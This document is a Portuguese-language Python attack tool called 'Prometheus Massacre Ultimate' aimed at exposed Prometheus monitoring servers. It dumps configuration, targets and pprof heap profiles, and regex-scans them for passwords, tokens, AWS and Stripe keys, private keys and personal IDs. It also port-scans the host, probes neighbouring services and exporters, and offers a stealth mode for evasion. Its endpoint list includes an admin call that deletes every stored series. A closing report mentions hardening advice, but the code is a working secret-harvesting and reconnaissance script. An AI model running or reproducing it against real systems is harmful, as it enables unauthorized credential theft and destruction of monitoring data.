import requests
import os
import re
import zipfile
import json
import argparse
import time
import concurrent.futures
from datetime import datetime
import socket

# ==============================
#     CONFIGURAÇÃO BRUTALITY
# ==============================

parser = argparse.ArgumentParser(description="Prometheus Massacre Ultimate - Coleta brutal de dados")
parser.add_argument("--url", default="http://192.168.100.1:9090", help="URL do Prometheus alvo")
parser.add_argument("--stealth", action="store_true", help="Modo stealth (1 req/seg)")
parser.add_argument("--massacre", action="store_true", help="Modo massacre (paralelismo máximo)")
parser.add_argument("--depth", type=int, default=1, help="Profundidade de análise (1-5)")
parser.add_argument("--output", help="Diretório de saída personalizado")
args = parser.parse_args()

# Configurações baseadas nos argumentos
PROM_URL = args.url
STEALTH_MODE = args.stealth
MASSACRE_MODE = args.massacre
ANALYSIS_DEPTH = min(5, max(1, args.depth))  # Limita entre 1-5
OUTPUT_DIR = args.output if args.output else f"prometheus_massacre_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

# Criação do diretório de saída
os.makedirs(OUTPUT_DIR, exist_ok=True)
print(f"[+] PROMETHEUS MASSACRE ULTIMATE v1.0 - Iniciando...")
print(f"[+] Alvo: {PROM_URL}")
print(f"[+] Modo: {'STEALTH' if STEALTH_MODE else 'MASSACRE' if MASSACRE_MODE else 'NORMAL'}")
print(f"[+] Profundidade: {ANALYSIS_DEPTH}")
print(f"[+] Salvando em: {OUTPUT_DIR}")

# ==============================
#     PADRÕES DE DETECÇÃO
# ==============================

# Padrões de strings sensíveis - ampliados e brutais
SENSITIVE_PATTERNS = [
    # Credenciais
    rb"(?i)(api[-_]?key\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(secret\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(token\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(password\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(passwd\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(authorization\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(creds\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(credentials\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(auth_token\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(access_token\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(refresh_token\s*[:=]\s*[^\s;,}{]+)",
    
    # AWS/Cloud
    rb"(?i)(aws_access_key_id\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(aws_secret_access_key\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)([a-z0-9]{20,})",  # AWS Keys costumam ter esse tamanho
    rb"(?i)(AKIA[0-9A-Z]{16})",  # AWS Key pattern
    rb"(?i)(sk_live_[0-9a-zA-Z]{24})",  # Stripe live key
    rb"(?i)(rk_live_[0-9a-zA-Z]{24})",  # Stripe restricted key
    rb"(?i)(pk_live_[0-9a-zA-Z]{24})",  # Stripe publishable key
    rb"(?i)(SG\.[a-zA-Z0-9-_]{22}\.[a-zA-Z0-9-_]{43})",  # SendGrid API key
    
    # Banco de dados
    rb"(?i)(db_password\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(database_url\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(jdbc:[^\s;,}{]+)",
    rb"(?i)(postgres://[^\s;,}{]+)",
    rb"(?i)(mysql://[^\s;,}{]+)",
    rb"(?i)(mongodb://[^\s;,}{]+)",
    rb"(?i)(redis://[^\s;,}{]+)",
    rb"(?i)(mongodb\+srv://[^\s;,}{]+)",
    
    # Redes e hosts
    rb"(?i)(192\.168\.[0-9]{1,3}\.[0-9]{1,3})",  # IPs privados classe C
    rb"(?i)(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})",  # IPs privados classe A
    rb"(?i)(172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3})",  # IPs privados classe B
    rb"(?i)(https?://[\w\.-]+\.[a-zA-Z]{2,})",  # URLs
    rb"(?i)(ftps?://[\w\.-]+\.[a-zA-Z]{2,})",  # FTP URLs
    rb"(?i)(smtp://[\w\.-]+\.[a-zA-Z]{2,})",  # SMTP URLs
    
    # Emails, nomes, informações de identificação
    rb"(?i)([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)",  # Emails
    rb"(?i)(cpf\s*[:=]\s*[0-9]{3}\.?[0-9]{3}\.?[0-9]{3}\-?[0-9]{2})",  # CPFs
    rb"(?i)(cnpj\s*[:=]\s*[0-9]{2}\.?[0-9]{3}\.?[0-9]{3}\/?[0-9]{4}\-?[0-9]{2})",  # CNPJs
    
    # JWT Tokens
    rb"eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}",  # JWT Pattern
    
    # Chaves e certificados
    rb"-----BEGIN PRIVATE KEY-----",
    rb"-----BEGIN RSA PRIVATE KEY-----",
    rb"-----BEGIN CERTIFICATE-----",
    rb"-----BEGIN PGP PRIVATE KEY BLOCK-----",
    
    # Informações do Prometheus específicas
    rb"(?i)(scrape_interval\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(evaluation_interval\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(job_name\s*[:=]\s*[^\s;,}{]+)",
    rb"(?i)(targets\s*[:=]\s*[^\s;,}{]+)"
]

# Lista expandida de endpoints conhecidos do Prometheus - Ampliada para máxima extração
PROMETHEUS_ENDPOINTS = [
    # Endpoints básicos
    "/metrics",
    "/api/v1/query?query=up",
    "/api/v1/targets",
    "/api/v1/label/__name__/values",
    "/api/v1/status/config",
    "/api/v1/status/flags",
    "/api/v1/status/runtimeinfo",
    
    # Interface web
    "/graph",
    "/targets",
    "/alerts",
    "/rules",
    "/status",
    "/tsdb-status",
    "/config",
    "/flags",
    "/service-discovery",
    
    # Debug/profiling
    "/debug/pprof/",
    "/debug/pprof/heap",
    "/debug/pprof/allocs",
    "/debug/pprof/profile?seconds=30",
    "/debug/pprof/goroutine",
    "/debug/pprof/block",
    "/debug/pprof/threadcreate",
    "/debug/pprof/mutex",
    "/debug/pprof/trace",
    "/debug/pprof/cmdline",
    "/debug/pprof/symbol",
    "/debug/vars",
    
    # Endpoints de API
    "/api/v1/series?match[]={__name__=~'.*'}",
    "/api/v1/query_range?query=up&start=1633046400&end=1633132800&step=15s",
    "/api/v1/labels",
    "/api/v1/alertmanagers",
    "/api/v1/metadata",
    "/api/v1/status/buildinfo",
    "/api/v1/status/tsdb",
    "/api/v1/status/walreplay",
    
    # Consultas específicas que podem revelar metadados importantes
    "/api/v1/query?query=scrape_duration_seconds",
    "/api/v1/query?query=scrape_samples_post_metric_relabeling",
    "/api/v1/query?query=up",
    "/api/v1/query?query=process_open_fds",
    "/api/v1/query?query=process_max_fds",
    "/api/v1/query?query=process_virtual_memory_bytes",
    "/api/v1/query?query=process_resident_memory_bytes",
    "/api/v1/query?query=go_memstats_alloc_bytes",
    "/api/v1/query?query=prometheus_tsdb_head_series",
    "/api/v1/query?query=prometheus_build_info",
    
    # Tentativas de descobrir endpoints personalizados
    "/-/healthy",
    "/-/ready",
    "/healthz",
    "/readyz",
    "/version",
    "/static",
    "/console",
    "/consoles",
    
    # Endpoints relacionados à federação e outros recursos
    "/federate?match[]={job!=''}",
    "/api/v1/admin/tsdb/snapshot",
    "/api/v1/admin/tsdb/delete_series?match[]={job!=''}",
]

# Consultas PromQL para tentar (se depth >= 3)
PROMQL_QUERIES = [
    "up",  # Quem está up
    "scrape_duration_seconds",  # Tempo de scrape
    "scrape_samples_post_metric_relabeling",  # Amostras por scrape
    "go_memstats_alloc_bytes",  # Memória alocada
    "process_resident_memory_bytes",  # Memória do processo
    "rate(go_memstats_alloc_bytes_total[5m])",  # Taxa de alocação
    "rate(process_cpu_seconds_total[5m])",  # Uso de CPU
    "sum by(job) (up)",  # Serviços UP por job
    "{__name__=~'.+'}",  # Todas as métricas
    "cdntv_delivery_viewers",  # Específica do target (vista anteriormente)
    "cdntv_vod_delivery_viewers",  # Específica do target (vista anteriormente)
]

# ==============================
#     FUNÇÕES DE COLETA
# ==============================

def save_response(endpoint, filename, timeout=15):
    """Salva a resposta de um endpoint em um arquivo"""
    try:
        url = f"{PROM_URL}{endpoint}"
        print(f"[+] Coletando: {url}")
        
        response = requests.get(url, timeout=timeout)
        file_path = os.path.join(OUTPUT_DIR, filename)
        
        with open(file_path, "wb") as f:
            f.write(response.content)
            
        print(f"[+] Salvo ({response.status_code}): {filename} ({len(response.content)} bytes)")
        
        # Salva headers separadamente
        headers_path = os.path.join(OUTPUT_DIR, f"headers_{filename}.txt")
        with open(headers_path, "w", encoding='utf-8') as f:
            for key, value in response.headers.items():
                f.write(f"{key}: {value}\n")
        
        # Se for JSON, tenta extrair informações adicionais
        if 'application/json' in response.headers.get('Content-Type', ''):
            analyze_json_response(response.text, filename)
        
        if STEALTH_MODE:
            print("[*] Modo stealth ativado, aguardando...")
            time.sleep(1)  # Pausa entre requisições no modo stealth
            
        return True
    except Exception as e:
        print(f"[!] ERRO em {endpoint}: {str(e)}")
        return False

def analyze_json_response(content, source_filename):
    """Analisa e extrai informações interessantes de respostas JSON"""
    try:
        json_data = json.loads(content)
        findings = []
        
        # Extrai informações de interesse específicas
        if "targets.json" in source_filename:
            # Extrai todos os IPs/serviços de targets
            if "data" in json_data and "activeTargets" in json_data["data"]:
                targets = []
                for target in json_data["data"]["activeTargets"]:
                    if "scrapeUrl" in target:
                        targets.append(target["scrapeUrl"])
                    if "discoveredLabels" in target and "__address__" in target["discoveredLabels"]:
                        targets.append(target["discoveredLabels"]["__address__"])
                
                if targets:
                    findings.append("# Alvos detectados")
                    findings.extend(targets)
        
        # Extrai todos os caminhos de arquivos do JSON
        file_paths = []
        def extract_paths(obj, current_path=""):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, str) and ('/' in v or '\\' in v) and len(v) > 5:
                        if any(ext in v.lower() for ext in ['.yml', '.yaml', '.json', '.conf', '.config', '.ini', '.toml']):
                            file_paths.append(v)
                    extract_paths(v, current_path + "." + k if current_path else k)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    extract_paths(item, f"{current_path}[{i}]")
        
        extract_paths(json_data)
        if file_paths:
            findings.append("\n# Caminhos de arquivos detectados")
            findings.extend(file_paths)
        
        # Salva análise se encontrou algo
        if findings:
            analysis_path = os.path.join(OUTPUT_DIR, f"analysis_{source_filename}.txt")
            with open(analysis_path, "w", encoding='utf-8') as f:
                f.write("\n".join(findings))
            print(f"[+] Análise de {source_filename} salva ({len(findings)} itens)")
    
    except json.JSONDecodeError:
        # Não é JSON válido, ignora
        pass
    except Exception as e:
        print(f"[!] Erro na análise de {source_filename}: {str(e)}")

def extract_strings_from_binary(file_path):
    """Extrai strings legíveis de um arquivo binário"""
    results = []
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
            # Busca strings ASCII/Unicode imprimíveis com pelo menos 4 caracteres
            strings = re.findall(rb"[\x20-\x7E]{4,}", content)
            for s in strings:
                results.append(s.decode(errors='ignore'))
    except Exception as e:
        print(f"[!] ERRO extraindo strings de {file_path}: {str(e)}")
    return results

def search_sensitive_data(strings_list, file_name):
    """Procura por dados sensíveis em uma lista de strings"""
    findings = []
    for line in strings_list:
        line_bytes = line.encode() 
        for pattern in SENSITIVE_PATTERNS:
            matches = re.findall(pattern, line_bytes)
            if matches:
                for match in matches:
                    if isinstance(match, tuple):  # Para grupos de captura
                        findings.append(line)
                    else:
                        findings.append(line)
                break  # Evita duplicações da mesma linha
    
    if findings:
        findings_path = os.path.join(OUTPUT_DIR, f"LEAKS_{file_name}.txt")
        with open(findings_path, "w", encoding='utf-8') as f:
            f.write(f"# {len(findings)} potenciais vazamentos encontrados em {file_name}\n\n")
            for item in findings:
                f.write(f"{item}\n")
                f.write("-" * 80 + "\n")  # Separador
        print(f"[!!!] 🚨 VAZAMENTOS ENCONTRADOS em {file_name}! ({len(findings)} itens)")
        return True
    else:
        print(f"[OK] Nenhum vazamento encontrado em {file_name}")
        return False

def zip_output():
    """Comprime todos os resultados em um arquivo ZIP"""
    try:
        zip_name = f"{OUTPUT_DIR}.zip"
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(OUTPUT_DIR):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(OUTPUT_DIR))
                    zipf.write(file_path, arcname)
        print(f"[+] Tudo comprimido em: {zip_name}")
        return True
    except Exception as e:
        print(f"[!] ERRO ao comprimir resultados: {str(e)}")
        return False

def run_port_scan(host, start_port=9000, end_port=9100):
    """Realiza um scan rápido de portas próximas"""
    open_ports = []
    hostname = host.replace("http://", "").replace("https://", "").split(":")[0]
    
    print(f"[+] Escaneando portas em {hostname} ({start_port}-{end_port})...")
    
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((hostname, port))
        if result == 0:
            open_ports.append(port)
            print(f"[+] Porta {port} aberta em {hostname}")
        sock.close()
    
    # Salva resultados
    if open_ports:
        with open(os.path.join(OUTPUT_DIR, "port_scan.txt"), "w") as f:
            f.write(f"# Portas abertas em {hostname}\n")
            for port in open_ports:
                f.write(f"{port}\n")
    
    return open_ports

def generate_report():
    """Gera um relatório resumido da coleta"""
    try:
        # Contadores
        file_count = 0
        leak_files = 0
        total_leaks = 0
        
        # Coleta estatísticas
        for root, _, files in os.walk(OUTPUT_DIR):
            file_count += len(files)
            for file in files:
                if file.startswith("LEAKS_"):
                    leak_files += 1
                    # Conta leaks
                    leak_path = os.path.join(root, file)
                    with open(leak_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        leak_count = content.count("----------")
                        total_leaks += leak_count
        
        # Cria relatório
        report_path = os.path.join(OUTPUT_DIR, "_RELATORIO_FINAL.txt")
        with open(report_path, "w", encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("                  RELATÓRIO DE MASSACRE AO PROMETHEUS\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"Alvo: {PROM_URL}\n")
            f.write(f"Data/hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write(f"Modo: {'STEALTH' if STEALTH_MODE else 'MASSACRE' if MASSACRE_MODE else 'NORMAL'}\n")
            f.write(f"Profundidade: {ANALYSIS_DEPTH}\n\n")
            f.write("-" * 80 + "\n")
            f.write("ESTATÍSTICAS:\n")
            f.write(f"- Total de arquivos coletados: {file_count}\n")
            f.write(f"- Arquivos com vazamentos: {leak_files}\n")
            f.write(f"- Total de possíveis vazamentos: {total_leaks}\n")
            f.write("-" * 80 + "\n\n")
            f.write("PRÓXIMOS PASSOS:\n")
            f.write("1. Verificar os arquivos LEAKS_* para dados sensíveis\n")
            f.write("2. Revisar os dumps do heap e allocs para mais informações\n")
            f.write("3. Considerar implementar autenticação no Prometheus\n")
            f.write("4. Restringir acesso ao endpoint /debug e às APIs\n")
            f.write("\nOBSERVAÇÕES:\n")
            f.write("O Prometheus exposto sem proteção é um risco severo de segurança.\n")
            f.write("Os dados coletados podem revelar informações sensíveis da infraestrutura.\n")
            
        print(f"[+] Relatório final gerado: _RELATORIO_FINAL.txt")
        return True
    except Exception as e:
        print(f"[!] ERRO ao gerar relatório: {str(e)}")
        return False

# ==============================
#     EXECUÇÃO PRINCIPAL
# ==============================

def collect_endpoints():
    """Coleta todos os endpoints padrão"""
    print("\n[+] FASE 1: Coletando endpoints padrão do Prometheus...")
    
    # Coleta endpoints em paralelo se modo massacre ativado
    if MASSACRE_MODE:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for endpoint in PROMETHEUS_ENDPOINTS:
                filename = endpoint.replace("/", "_").replace("?", "_").lstrip("_")
                if filename == "": filename = "index"
                future = executor.submit(save_response, endpoint, filename)
                futures[future] = endpoint
            
            for future in concurrent.futures.as_completed(futures):
                endpoint = futures[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[!] Erro na coleta de {endpoint}: {str(e)}")
    else:
        # Coleta sequencial 
        for endpoint in PROMETHEUS_ENDPOINTS:
            filename = endpoint.replace("/", "_").replace("?", "_").lstrip("_")
            if filename == "": filename = "index"
            save_response(endpoint, filename)

def collect_custom_queries():
    """Coleta métricas específicas via PromQL queries"""
    if ANALYSIS_DEPTH >= 3:
        print("\n[+] FASE 2: Coletando métricas com queries PromQL específicas...")
        
        # Queries básicas
        for i, query in enumerate(PROMQL_QUERIES):
            endpoint = f"/api/v1/query?query={requests.utils.quote(query)}"
            filename = f"query_{i}_{query.replace('/', '_').replace('?', '_').replace('*', 'all')[:30]}.json"
            save_response(endpoint, filename)
        
        # Coleta TODAS as métricas disponíveis se profundidade máxima
        if ANALYSIS_DEPTH >= 5:
            try:
                # Primeiro obtém todos os nomes de métricas disponíveis
                response = requests.get(f"{PROM_URL}/api/v1/label/__name__/values", timeout=15)
                if response.status_code == 200:
                    metrics_data = response.json()
                    if "data" in metrics_data and isinstance(metrics_data["data"], list):
                        all_metrics = metrics_data["data"]
                        print(f"[+] Encontradas {len(all_metrics)} métricas disponíveis. Coletando valores para cada uma...")
                        
                        # Cria um arquivo para mapear todas as métricas e seus valores
                        metrics_map_path = os.path.join(OUTPUT_DIR, "ALL_METRICS_VALUES.json")
                        metrics_values = {}
                        
                        # Coleta no máximo 100 métricas para evitar sobrecarga
                        sample_size = min(100, len(all_metrics))
                        sampled_metrics = all_metrics[:sample_size]
                        
                        for metric_name in sampled_metrics:
                            try:
                                # Obtém valores atuais da métrica
                                query_endpoint = f"/api/v1/query?query={requests.utils.quote(metric_name)}"
                                metric_response = requests.get(f"{PROM_URL}{query_endpoint}", timeout=15)
                                
                                if metric_response.status_code == 200:
                                    metric_data = metric_response.json()
                                    if "data" in metric_data and "result" in metric_data["data"]:
                                        metrics_values[metric_name] = metric_data["data"]["result"]
                                        
                                        # Procura IPs, hostnames e outros dados sensíveis 
                                        if MASSACRE_MODE:
                                            metric_content = json.dumps(metric_data)
                                            if re.search(r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)', metric_content):
                                                ip_path = os.path.join(OUTPUT_DIR, "IPS_FROM_METRICS.txt")
                                                with open(ip_path, "a", encoding='utf-8') as f:
                                                    f.write(f"Found in metric {metric_name}:\n")
                                                    f.write(json.dumps(metric_data, indent=2))
                                                    f.write("\n" + "-"*80 + "\n")
                                
                                if STEALTH_MODE:
                                    time.sleep(0.5)  # Pausa entre requisições
                                    
                            except Exception as e:
                                print(f"[!] Erro ao coletar métrica {metric_name}: {str(e)}")
                        
                        # Salva mapeamento completo
                        with open(metrics_map_path, "w", encoding='utf-8') as f:
                            json.dump(metrics_values, f, indent=2)
                        
                        print(f"[+] Mapeamento completo de métricas salvo em ALL_METRICS_VALUES.json")
            except Exception as e:
                print(f"[!] Erro ao coletar todas as métricas: {str(e)}")

def analyze_dumps():
    """Analisa dumps de memória em busca de dados sensíveis"""
    print("\n[+] FASE 3: Analisando dumps de memória...")
    
    dump_files = [f for f in os.listdir(OUTPUT_DIR) 
                if f.endswith(".dump") or "pprof" in f]
    
    for dump_file in dump_files:
        file_path = os.path.join(OUTPUT_DIR, dump_file)
        print(f"[+] Extraindo strings de {dump_file}...")
        strings_list = extract_strings_from_binary(file_path)
        print(f"[+] {len(strings_list)} strings extraídas de {dump_file}")
        
        if len(strings_list) > 0:
            search_sensitive_data(strings_list, dump_file)

def advanced_analysis():
    """Realiza análises adicionais para profundidade >= 4"""
    if ANALYSIS_DEPTH >= 4:
        print("\n[+] FASE 4: Realizando análises avançadas e brutais...")
        
        # Extrai todo o conteúdo do Prometheus para análise de texto completa
        try:
            # Analisa o conteúdo dos arquivos já coletados em busca de padrões interessantes
            print("[+] Realizando análise de texto em todos os arquivos coletados...")
            all_findings = {}
            
            for root, _, files in os.walk(OUTPUT_DIR):
                for file in files:
                    if file.startswith("LEAKS_") or file.startswith("headers_") or file.endswith(".zip"):
                        continue  # Pula arquivos já analisados
                    
                    file_path = os.path.join(root, file)
                    try:
                        # Tenta abrir como texto
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Procura por padrões específicos de URL
                            urls = re.findall(r'https?://[^\s<>"\']+|www\.[^\s<>"\']+', content)
                            if urls:
                                if "URLS_FOUND.txt" not in all_findings:
                                    all_findings["URLS_FOUND.txt"] = []
                                for url in urls:
                                    all_findings["URLS_FOUND.txt"].append(f"Em {file}: {url}")
                            
                            # Procura por nome de usuários em formatos comuns
                            usernames = re.findall(r'username["\'\s:=]+([^\s"\']+)', content, re.IGNORECASE)
                            if usernames:
                                if "USERNAMES_FOUND.txt" not in all_findings:
                                    all_findings["USERNAMES_FOUND.txt"] = []
                                for username in usernames:
                                    all_findings["USERNAMES_FOUND.txt"].append(f"Em {file}: {username}")
                            
                            # Procura por caminhos de arquivo
                            filepaths = re.findall(r'[\/\\](?:[a-zA-Z0-9_-]+[\/\\])+[a-zA-Z0-9_-]+\.[a-zA-Z0-9]+', content)
                            if filepaths:
                                if "FILEPATHS_FOUND.txt" not in all_findings:
                                    all_findings["FILEPATHS_FOUND.txt"] = []
                                for filepath in filepaths:
                                    all_findings["FILEPATHS_FOUND.txt"].append(f"Em {file}: {filepath}")
                    except:
                        # Se falhar como texto, pode ser binário
                        pass
            
            # Salva todos os achados
            for filename, findings in all_findings.items():
                with open(os.path.join(OUTPUT_DIR, filename), 'w', encoding='utf-8') as f:
                    f.write(f"# {len(findings)} ocorrências encontradas\n\n")
                    for finding in findings:
                        f.write(f"{finding}\n")
                    print(f"[+] Salvos {len(findings)} achados em {filename}")
        
        except Exception as e:
            print(f"[!] Erro na análise de texto: {str(e)}")
        
        # Tenta extrair host do Prometheus URL
        try:
            host = PROM_URL.split("://")[1].split("/")[0].split(":")[0]
            
            # Determina a porta principal do Prometheus
            if ":" in PROM_URL.split("://")[1].split("/")[0]:
                main_port = int(PROM_URL.split(":")[-1].split("/")[0])
            else:
                main_port = 80 if PROM_URL.startswith("http://") else 443
            
            # Grava informações do alvo
            with open(os.path.join(OUTPUT_DIR, "TARGET_INFO.txt"), 'w') as f:
                f.write(f"Host: {host}\n")
                f.write(f"Porta: {main_port}\n")
                
                # Tenta resolver mais informações sobre o host
                try:
                    ip_address = socket.gethostbyname(host)
                    f.write(f"IP: {ip_address}\n")
                    
                    # Verifica se é um IP privado
                    is_private = False
                    if ip_address.startswith("10.") or ip_address.startswith("172.16.") or \
                       ip_address.startswith("192.168.") or ip_address.startswith("127."):
                        is_private = True
                    f.write(f"IP Privado: {'Sim' if is_private else 'Não'}\n")
                except:
                    f.write("Não foi possível resolver o IP\n")
                
                # Tenta obter informações de cabeçalhos HTTP
                try:
                    response = requests.head(PROM_URL, timeout=5)
                    f.write("\nCabeçalhos HTTP:\n")
                    for header, value in response.headers.items():
                        f.write(f"{header}: {value}\n")
                except:
                    f.write("Não foi possível obter cabeçalhos HTTP\n")
            
            # Escaneia portas próximas
            scan_start = max(main_port - 50, 1)
            scan_end = min(main_port + 50, 65535)
            open_ports = run_port_scan(host, scan_start, scan_end)
            
            # Procura por outros serviços nas portas abertas
            service_check_urls = [
                "/metrics",  # Prometheus/Exporters
                "/",         # HTTP genérico
                "/api",      # APIs genéricas
                "/api/v1/status", # Status APIs
                "/status",   # Status endpoints
                "/health",   # Health checks
                "/actuator", # Spring Boot
                "/swagger",  # Swagger
                "/grafana",  # Grafana
                "/alertmanager", # Alertmanager
            ]
            
            for port in open_ports:
                if port != main_port:
                    alt_url_base = f"http://{host}:{port}"
                    
                    # Tenta detectar serviços conhecidos
                    for check_path in service_check_urls:
                        try:
                            check_url = f"{alt_url_base}{check_path}"
                            r = requests.get(check_url, timeout=3)
                            
                            if r.status_code < 400:  # Se responder sem erro
                                print(f"[!!!] Serviço encontrado em {check_url} (Status: {r.status_code})")
                                service_file = os.path.join(OUTPUT_DIR, f"service_port_{port}_{check_path.replace('/', '_')}.html")
                                
                                with open(service_file, "wb") as f:
                                    f.write(r.content)
                                
                                # Salva também os headers
                                headers_file = os.path.join(OUTPUT_DIR, f"headers_port_{port}_{check_path.replace('/', '_')}.txt")
                                with open(headers_file, "w", encoding='utf-8') as f:
                                    for header, value in r.headers.items():
                                        f.write(f"{header}: {value}\n")
                        except:
                            pass  # Ignora erros de conexão
            
            # Procura por outros exporters comuns do Prometheus
            if ANALYSIS_DEPTH >= 5:
                print("[+] Procurando por exporters comuns do Prometheus...")
                exporter_ports = {
                    9100: "node_exporter",
                    9104: "mysql_exporter",
                    9187: "postgres_exporter",
                    9113: "nginx_exporter",
                    9115: "blackbox_exporter",
                    9117: "apache_exporter",
                    3000: "grafana",
                    9093: "alertmanager",
                    9091: "pushgateway"
                }
                
                for port, exporter in exporter_ports.items():
                    try:
                        exporter_url = f"http://{host}:{port}/metrics"
                        r = requests.get(exporter_url, timeout=2)
                        
                        if r.status_code == 200:
                            print(f"[!!!] Possível {exporter} encontrado em {exporter_url}!")
                            
                            with open(os.path.join(OUTPUT_DIR, f"exporter_{exporter}_port_{port}.txt"), "wb") as f:
                                f.write(r.content)
                    except:
                        pass  # Ignora falhas de conexão
                
        except Exception as e:
            print(f"[!] Erro na análise avançada de rede: {str(e)}")

def main():
    """Função principal de execução"""
    start_time = time.time()
    
    print("\n" + "=" * 80)
    print(" "*25 + "PROMETHEUS MASSACRE ULTIMATE")
    print("=" * 80 + "\n")
    
    # Fase 1: Coleta de endpoints
    collect_endpoints()
    
    # Fase 2: Consultas personalizadas
    collect_custom_queries()
    
    # Fase 3: Análise de dumps
    analyze_dumps()
    
    # Fase 4: Análise avançada
    advanced_analysis()
    
    # Fase 5: Relatório final
    generate_report()
    
    # Compacta resultados
    zip_output()
    
    end_time = time.time()
    duration = end_time - start_time
    
    print("\n" + "=" * 80)
    print(f"MASSACRE CONCLUÍDO EM {duration:.2f} SEGUNDOS!")
    print(f"Resultados disponíveis em: {OUTPUT_DIR} e {OUTPUT_DIR}.zip")
    print("=" * 80 + "\n")

if __name__ == "__main__":
    main()
